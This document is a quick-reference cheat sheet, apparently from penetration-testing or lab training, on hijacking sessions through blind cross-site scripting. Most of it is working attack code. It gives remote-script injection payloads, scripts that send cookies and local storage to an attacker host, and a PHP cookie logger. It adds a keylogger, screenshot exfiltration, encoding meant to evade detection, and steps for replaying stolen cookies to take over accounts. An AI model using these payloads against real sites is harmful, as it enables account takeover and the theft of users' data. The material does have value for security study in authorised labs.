# XSS Session Hijacking Quick Reference

## What is Session Hijacking?

**Session Hijacking** = Steal victim's cookies via XSS to gain access to their account

**Attack Flow**:
```
Blind XSS → Inject remote script → Steal cookie → Use cookie → Access account
```

## Blind XSS Detection

### What is Blind XSS?

**Blind XSS** = XSS triggered on page you can't access (e.g., admin panel)

**Common Locations**:
- Contact forms
- Support tickets
- User registration
- Reviews/feedback
- User profile updates
- HTTP headers (User-Agent, Referer)

### Problem with Blind XSS
```
❌ Can't see output
❌ Can't test in browser
❌ Don't know which field is vulnerable
❌ Don't know which payload works
```

### Solution: Remote Script Loading

## Step 1: Setup Listener

```bash
# Create directory
mkdir /tmp/tmpserver
cd /tmp/tmpserver

# Start PHP server
sudo php -S 0.0.0.0:80

# Or netcat
sudo nc -lvnp 80
```

## Step 2: Test Remote Script Payloads

### Basic Remote Script Payload
```html
<script src=http://YOUR_IP></script>
```

### Identify Vulnerable Field
```html
<!-- Add field name to URL -->
<script src=http://YOUR_IP/fullname></script>
<script src=http://YOUR_IP/username></script>
<script src=http://YOUR_IP/website></script>
<script src=http://YOUR_IP/comment></script>
```

**When you get HTTP request**: That field is vulnerable!

### Common Blind XSS Payloads

```html
<!-- Basic -->
<script src=http://YOUR_IP></script>

<!-- With single quote escape -->
'><script src=http://YOUR_IP></script>

<!-- With double quote escape -->
"><script src=http://YOUR_IP></script>

<!-- JavaScript eval -->
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://YOUR_IP\';document.body.appendChild(a)')

<!-- XMLHttpRequest -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//YOUR_IP");a.send();</script>

<!-- jQuery -->
<script>$.getScript("http://YOUR_IP")</script>

<!-- Image tag -->
<img src=x onerror="var s=document.createElement('script');s.src='http://YOUR_IP';document.body.appendChild(s)">
```

## Step 3: Create Cookie Stealer Script

### Create script.js
```javascript
new Image().src='http://YOUR_IP/index.php?c='+document.cookie;
```

**Why Image()?**
- Less suspicious than redirect
- Doesn't change page
- Silent execution

### Alternative Cookie Stealers
```javascript
// Redirect (more obvious)
document.location='http://YOUR_IP/index.php?c='+document.cookie;

// Fetch API
fetch('http://YOUR_IP/steal?c='+document.cookie);

// XMLHttpRequest
var xhr=new XMLHttpRequest();xhr.open('GET','http://YOUR_IP/?c='+document.cookie);xhr.send();
```

## Step 4: Create PHP Cookie Logger

### Save as index.php
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### Enhanced Version (with timestamp)
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        $timestamp = date("Y-m-d H:i:s");
        fputs($file, "[$timestamp] Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

## Step 5: Deploy Attack

### File Structure
```bash
/tmp/tmpserver/
├── index.php    # Cookie logger
└── script.js    # Cookie stealer
```

### Start Server
```bash
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### Inject Payload
```html
<!-- Use working payload from detection phase -->
<script src=http://YOUR_IP/script.js></script>
```

## Step 6: Wait for Callback

### Expected Output (Terminal)
```
10.10.10.5:52798 [200]: /script.js
10.10.10.5:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

### Check Captured Cookies
```bash
cat cookies.txt

# Output:
Victim IP: 10.10.10.5 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
Victim IP: 10.10.10.6 | Cookie: PHPSESSID=abc123def456
```

## Step 7: Use Stolen Cookie

### Firefox (Shift+F9)
```
1. Navigate to login page
2. Press Shift+F9 (Storage tab)
3. Click Cookies
4. Click + button
5. Add cookie:
   Name: cookie (part before =)
   Value: f904f93c949d19d870911bf8b05fe7b2 (part after =)
6. Refresh page
7. Access granted!
```

### Chrome (F12 → Application)
```
1. F12 → Application tab
2. Storage → Cookies
3. Double-click to add new
4. Set Name and Value
5. Refresh page
```

### Using cURL
```bash
curl http://target.com/admin -H "Cookie: session=STOLEN_COOKIE_VALUE"
```

### Using Burp Suite
```
1. Intercept request
2. Add/modify Cookie header:
   Cookie: PHPSESSID=stolen_value
3. Forward request
```

## Full Attack Workflow

### 1. Setup
```bash
# Get your IP
ip a | grep tun0

# Create files
mkdir /tmp/tmpserver && cd /tmp/tmpserver

# Create script.js
echo "new Image().src='http://YOUR_IP/index.php?c='+document.cookie;" > script.js

# Create index.php
cat > index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF

# Start server
sudo php -S 0.0.0.0:80
```

### 2. Find Vulnerable Field
```html
<!-- Test each field -->
Fullname: <script src=http://YOUR_IP/fullname></script>
Username: <script src=http://YOUR_IP/username></script>
Website: <script src=http://YOUR_IP/website></script>
Comment: <script src=http://YOUR_IP/comment></script>
```

### 3. Deploy Cookie Stealer
```html
<!-- Use vulnerable field -->
<script src=http://YOUR_IP/script.js></script>
```

### 4. Monitor & Capture
```bash
# Terminal output
tail -f cookies.txt

# Check cookies
cat cookies.txt
```

### 5. Hijack Session
```
1. Copy cookie value
2. Open target site
3. F12 → Storage/Application
4. Add stolen cookie
5. Refresh → Logged in as victim
```

## Testing Checklist

✅ **Before Attack**:
- [ ] Get your IP (ifconfig/ip a)
- [ ] Create script.js
- [ ] Create index.php
- [ ] Start PHP server
- [ ] Test server accessible

✅ **During Detection**:
- [ ] Test all input fields
- [ ] Use unique URLs per field
- [ ] Monitor server for callbacks
- [ ] Note vulnerable field
- [ ] Note working payload

✅ **During Exploitation**:
- [ ] Deploy cookie stealer
- [ ] Wait for victim
- [ ] Verify cookie received
- [ ] Test cookie validity
- [ ] Access victim account

## Common Payloads by Context

### HTML Context
```html
<script src=http://YOUR_IP/script.js></script>
```

### Attribute Context
```html
'><script src=http://YOUR_IP/script.js></script>
"><script src=http://YOUR_IP/script.js></script>
```

### JavaScript Context
```javascript
';var s=document.createElement('script');s.src='http://YOUR_IP/script.js';document.body.appendChild(s);//
```

### User-Agent Header
```bash
curl -A "<script src=http://YOUR_IP/script.js></script>" http://target.com/contact
```

## Cookie Formats

### Session Cookie
```
PHPSESSID=abc123def456ghi789
```

### Custom Cookie
```
session=f904f93c949d19d870911bf8b05fe7b2
```

### Multiple Cookies
```
session=value1; auth=value2; user=value3
```

## Advanced Techniques

### Exfiltrate All Storage
```javascript
// Steal localStorage + sessionStorage + cookies
var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
};
fetch('http://YOUR_IP/steal', {
    method: 'POST',
    body: JSON.stringify(data)
});
```

### Keylogger
```javascript
document.onkeypress = function(e) {
    fetch('http://YOUR_IP/keys?k=' + e.key);
}
```

### Screenshot
```javascript
// Using html2canvas (if loaded)
html2canvas(document.body).then(canvas => {
    canvas.toBlob(blob => {
        var formData = new FormData();
        formData.append('screenshot', blob);
        fetch('http://YOUR_IP/screenshot', {method: 'POST', body: formData});
    });
});
```

## Blind XSS Tools

### XSS Hunter (Automated)
```
1. Sign up at xsshunter.com
2. Get your payload
3. Inject in vulnerable field
4. Get notified when triggered
```

### ezXSS (Self-Hosted)
```bash
git clone https://github.com/ssl/ezXSS
# Setup on your server
# Use generated payloads
```

### Burp Collaborator
```
1. Burp Suite → Burp Collaborator Client
2. Copy collaborator URL
3. Use in XSS payload:
   <script src=http://BURP_COLLABORATOR></script>
```

## Real-World Example

```bash
# 1. Setup
mkdir /tmp/hijack && cd /tmp/hijack
echo "new Image().src='http://10.10.14.5/index.php?c='+document.cookie" > script.js

cat > index.php << 'EOF'
<?php
if(isset($_GET['c'])){
    file_put_contents("cookies.txt", $_SERVER['REMOTE_ADDR']." | ".$_GET['c']."\n", FILE_APPEND);
}
?>
EOF

sudo php -S 0.0.0.0:80

# 2. Find vulnerable field
# Test: fullname, username, website, comment
# Payload: <script src=http://10.10.14.5/FIELD></script>

# 3. Deploy attack
# Vulnerable field: website
# Payload: <script src=http://10.10.14.5/script.js></script>
or "><script src=http://10.10.14.231/script.js></src>


# 4. Wait for victim
# Terminal shows: /script.js, then /index.php?c=session=abc123

# 5. Check captured cookie
cat cookies.txt
# Output: 10.129.5.10 | session=abc123def456

# 6. Use cookie
# Firefox: Shift+F9 → Add cookie → Refresh → Access granted
```

## Detection Evasion

### Encode Payload
```javascript
// Base64 encode
eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8v...'))

// Hex encode
eval(String.fromCharCode(110,101,119...))
```

### Use HTTPS
```html
<script src=https://YOUR_IP/script.js></script>
```

### Use Domain
```html
<!-- Instead of IP -->
<script src=http://attacker.com/script.js></script>
```

## Key Points

🔴 **Remember**:
- Blind XSS = Can't see execution
- Use remote script to detect
- Add field name to URL for identification
- Cookie stealer runs silently
- Multiple victims = multiple cookies

🎯 **Success Indicators**:
- HTTP request to your server
- Cookie in cookies.txt
- Can access victim account
- Session stays active

## Quick Commands

```bash
# Get IP
ip a | grep tun0

# Start server
sudo php -S 0.0.0.0:80

# Monitor cookies
tail -f cookies.txt

# Check captured
cat cookies.txt
```

